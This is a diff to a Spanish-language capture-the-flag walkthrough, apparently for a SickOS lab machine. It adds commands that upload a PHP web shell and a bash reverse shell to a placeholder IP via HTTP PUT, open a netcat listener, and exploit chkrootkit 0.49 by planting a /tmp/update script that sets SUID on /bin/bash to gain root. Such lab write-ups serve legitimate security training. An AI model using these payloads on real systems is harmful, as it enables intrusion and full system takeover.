@@ -56,6 +56,11 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 curl -v -T rev.sh http://localhost/test/rev.sh
 curl -v -T shell.php http://localhost/test/shell.php
 ```
+4. Como alternativa, puedes subir los ficheros al directorio vulnerable sin crear archivos peligrosos en tu ordenador.
+```bash
+curl -v -X PUT --data 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' http://localhost/test/rev.sh
+curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://localhost/test/shell.php
+```
 5. En la terminal 2, se pone a la escucha en el puerto configurado en la **reverse shell** del paso 2.
 ```bash
 nc -lvnp 4444
@@ -78,12 +83,19 @@ cat user.txt
 Con acceso inicial al sistema, se inicia la fase de escalada de privilegios.
 
 Se detecta que el sistema utiliza una versión vulnerable de **chkrootkit (0.49)** y que este se ejecuta automáticamente mediante tareas programadas.
-
+```bash
+/usr/sbin/chkrootkit -V
+ls -la /etc/cron.d/
+```
 Esta versión presenta una vulnerabilidad que permite ejecutar un archivo llamado `update` ubicado en `/tmp` con privilegios de administrador.
 
 Aprovechando este comportamiento, se crea un archivo malicioso que modifica los permisos del binario `/bin/bash`, activando el bit **SUID**.
-
-Cuando la tarea programada se ejecuta, el binario queda preparado para permitir la elevación de privilegios.
+```bash
+cd /tmp
+echo -e '#!/bin/bash\nchmod u+s /bin/bash' > update
+chmod +x update
+```
+Ahora sólo habrá que esperar un minuto y cuando la tarea programada se ejecuta, el binario queda preparado para permitir la elevación de privilegios.
 
 ---
 
@@ -91,13 +103,26 @@ Cuando la tarea programada se ejecuta, el binario queda preparado para permitir 
 Tras la ejecución de la tarea programada:
 
 - Se comprueba que `/bin/bash` tiene el bit **SUID** activo.
+```bash
+ls -la /bin/bash
+```
+Resultado esperado:
+```bash
+-rwsr-xr-x
+```
 - Se lanza una shell con privilegios elevados.
+```bash
+/bin/bash -p
+whoami
+```
 - Se obtiene acceso completo como **root**.
 
-Finalmente, se accede a las flags del sistema:
-
-- Flag de usuario: `/home/sickos/user.txt`
-- Flag de root: `/root/root.txt`
+Finalmente, se accede a las flags del root:
+```bash
+cd root
+ls
+cat root.txt
+```
 
 🏴‍☠️ **¡Máquina completamente comprometida!**
 
